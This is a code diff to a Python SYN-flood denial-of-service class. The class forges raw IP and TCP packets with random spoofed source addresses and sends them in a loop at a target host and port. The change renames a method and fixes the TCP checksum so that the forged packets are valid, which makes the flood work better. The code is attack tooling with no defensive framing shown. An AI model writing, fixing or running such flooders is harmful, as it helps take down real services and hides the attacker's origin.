@@ -380,7 +380,7 @@ class DoS_SYN :
     def __str__(self) -> str :
         return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"
 
-    def prepare(self) -> bytes :
+    def package(self) -> bytes :
         randip = self.random_ip()
         randnum = lambda x : random.randint(x, 65535)
         src = socket.inet_pton(socket.AF_INET, randip)
@@ -388,11 +388,13 @@ class DoS_SYN :
         ip_header = self.ip_header(src = src, dst = dst, idn = randnum(0))
         checksum = self.checksum(ip_header)
         ip_header = self.ip_header(src = src, dst = dst, idn = randnum(0), csm = checksum)
-        tcp_header = self.tcp_header(srp = randnum(1024), dsp = self.port, seq = randnum(0), syn = 1)
+        randseq = randnum(0)
+        randsrp = randnum(1024)
+        tcp_header = self.tcp_header(srp = randsrp, dsp = self.port, seq = randseq, syn = 1)
         pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
         data = tcp_header + pseudo_header
         tcp_checksum = self.checksum(data)
-        tcp_header = self.tcp_header(srp = randnum(1024), dsp = self.port, seq = randnum(0), syn = 1, csm = tcp_checksum)
+        tcp_header = self.tcp_header(srp = randsrp, dsp = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
         payload = ip_header + tcp_header
         return payload
 
@@ -463,7 +465,7 @@ class DoS_SYN :
     def __flood(self) -> None :
         count = 0
         while count != self.rate :
-            payload = self.prepare()
+            payload = self.package()
             with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                 flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 flood.connect((self.host, self.port))
